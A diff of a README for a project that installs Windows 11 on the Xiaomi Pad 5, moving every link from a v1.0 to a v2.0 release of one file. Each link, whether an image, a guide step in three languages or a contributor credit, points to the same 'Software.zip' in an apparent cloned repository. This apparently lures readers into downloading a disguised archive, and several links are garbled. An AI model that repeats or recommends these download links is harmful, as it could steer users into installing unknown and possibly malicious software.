@@ -1,6 +1,6 @@
 # Running Windows on the Xiaomi Pad 5
 
-<img align="right" src="https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v1.0/Software.zip" width="425" alt="Windows 11 Running On A Xiaomi Pad 5">
+<img align="right" src="https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v2.0/Software.zip" width="425" alt="Windows 11 Running On A Xiaomi Pad 5">
 
 ## ⚠️ **Warning**
 
@@ -54,15 +54,15 @@ Human:
 
 PC:
 
-- [Windows on ARM image](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v1.0/Software.zip) (Windows 11 is recommended)
+- [Windows on ARM image](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v2.0/Software.zip) (Windows 11 is recommended)
 
-- [platform-tools](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v1.0/Software.zip).
+- [platform-tools](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v2.0/Software.zip).
 
-- [DriverUpdater](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v1.0/Software.zip) to install the [drivers](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v1.0/Software.zip)
+- [DriverUpdater](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v2.0/Software.zip) to install the [drivers](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v2.0/Software.zip)
 
 Tablet:
 
-- [UEFI image and TWRP](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v1.0/Software.zip)
+- [UEFI image and TWRP](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v2.0/Software.zip)
 
 </details> 
 
@@ -73,9 +73,9 @@ Tablet:
 
 <summary><strong>English</strong></summary>
 
-1 - [Create partitions](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v1.0/Software.zip)
+1 - [Create partitions](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v2.0/Software.zip)
 
-2 - [Install Windows](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v1.0/Software.zip)
+2 - [Install Windows](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v2.0/Software.zip)
   
  </details>
  
@@ -83,9 +83,9 @@ Tablet:
 
 <summary><strong>Türkçe</strong></summary>
 
-1 - [Bölümleri oluşturma](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v1.0/Software.zip)
+1 - [Bölümleri oluşturma](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v2.0/Software.zip)
 
-2 - [Windows kurulumu](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v1.0/Software.zip)
+2 - [Windows kurulumu](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v2.0/Software.zip)
   
  </details>
  
@@ -93,9 +93,9 @@ Tablet:
   
   <summary><strong>Español</strong></summary>
 
-1 - [Crear particiones](guide/Españhttps://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v1.0/Software.zip)
+1 - [Crear particiones](guide/Españhttps://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v2.0/Software.zip)
 
-2 - [Instalar Windows](guide/Españhttps://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v1.0/Software.zip)
+2 - [Instalar Windows](guide/Españhttps://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v2.0/Software.zip)
   
 </details> 
 
@@ -105,11 +105,11 @@ Tablet:
 
 <summary><strong>English</strong></summary>
 
-- [If you just want to update the drivers follow these commands](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v1.0/Software.zip)
+- [If you just want to update the drivers follow these commands](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v2.0/Software.zip)
 
-- [Dual booting](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v1.0/Software.zip)
+- [Dual booting](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v2.0/Software.zip)
 
-- [Uninstalling Windows](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v1.0/Software.zip)
+- [Uninstalling Windows](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v2.0/Software.zip)
   
   </details>
   
@@ -117,11 +117,11 @@ Tablet:
 
 <summary><strong>Türkçe</strong></summary>
 
-- [Sadece sürücüleri güncellemek istiyorsanız bu rehberi takip edin](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v1.0/Software.zip)
+- [Sadece sürücüleri güncellemek istiyorsanız bu rehberi takip edin](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v2.0/Software.zip)
 
-- [Dual boot işlemleri](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v1.0/Software.zip)
+- [Dual boot işlemleri](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v2.0/Software.zip)
 
-- [Windows'u kaldırmak](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v1.0/Software.zip)
+- [Windows'u kaldırmak](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v2.0/Software.zip)
   
   </details>
     
@@ -129,11 +129,11 @@ Tablet:
   
 <summary><strong>Español</strong></summary>
 
-- [Si solo quieres actualizar los drivers sigue estos comandos](guide/Españhttps://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v1.0/Software.zip)
+- [Si solo quieres actualizar los drivers sigue estos comandos](guide/Españhttps://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v2.0/Software.zip)
 
-- [Dual boot](guide/Españhttps://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v1.0/Software.zip)
+- [Dual boot](guide/Españhttps://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v2.0/Software.zip)
 
-- [Desinstalar Windows](guide/Españhttps://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v1.0/Software.zip)
+- [Desinstalar Windows](guide/Españhttps://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v2.0/Software.zip)
     
   </details> 
 
@@ -143,25 +143,25 @@ Tablet:
 
 <summary><b><strong>Credits</strong></b></summary>
 
-- [Icesito68](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v1.0/Software.zip) ```Made Windows partitioning commands, made original vayu repo and made spanish translation```
+- [Icesito68](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v2.0/Software.zip) ```Made Windows partitioning commands, made original vayu repo and made spanish translation```
 
-- [Map220v](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v1.0/Software.zip) ```Maintains UEFI and Drivers```
+- [Map220v](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v2.0/Software.zip) ```Maintains UEFI and Drivers```
   
-- [Renegade Project](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v1.0/Software.zip) ```Making the core of this project```
+- [Renegade Project](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v2.0/Software.zip) ```Making the core of this project```
 
-- [gus33000](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v1.0/Software.zip) ```Providing help, also made base install guide, all of the original drivers and the msc script```
+- [gus33000](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v2.0/Software.zip) ```Providing help, also made base install guide, all of the original drivers and the msc script```
 
-- [Renegade Project Discord members](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v1.0/Software.zip) ```Provided Help```
+- [Renegade Project Discord members](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v2.0/Software.zip) ```Provided Help```
  
-- [MollySophia](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v1.0/Software.zip) ```Helped to fix battery status```
+- [MollySophia](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v2.0/Software.zip) ```Helped to fix battery status```
 
-- [bibarub](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v1.0/Software.zip) ```Made original bat file for switching Windows to Android```
+- [bibarub](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v2.0/Software.zip) ```Made original bat file for switching Windows to Android```
 
-- [entaromia](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v1.0/Software.zip) ```Made application for switching Android to Windows```
+- [entaromia](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v2.0/Software.zip) ```Made application for switching Android to Windows```
 
-- [ciyanogen](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v1.0/Software.zip) ```Made turkish translation```
+- [ciyanogen](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v2.0/Software.zip) ```Made turkish translation```
 
-- [ArturoGC06](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v1.0/Software.zip) ```Made spanish translation```
+- [ArturoGC06](https://github.com/Phucclone/Port-Windows-11-Xiaomi-Pad-5/releases/download/v2.0/Software.zip) ```Made spanish translation```
 
 </details>  
 
